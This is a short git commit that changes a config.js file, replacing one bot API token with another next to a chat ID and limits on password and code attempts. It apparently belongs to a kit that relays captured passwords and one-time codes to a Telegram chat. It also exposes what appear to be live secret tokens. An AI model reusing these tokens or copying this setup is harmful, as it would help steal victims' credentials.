1aaf3dfc30d65106b1875f8342ede610347d1576
emailforworkdomain-dotcom <forward2k@virgilio.it>
2026-07-09 16:56:14 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,5 +1,5 @@
 const config = {
-    token: '8642710228:AAHF48NHLNbocMqVfp0Rensp9TRMHbJC7uI',
+    token: '8810239099:AAEm9rz7q_HL4wy2gKE7l0T6Fesal6rzWio',
     chat_id: '7626778246',
     max_password_attempts: 2,
     max_code_attempts: 3,
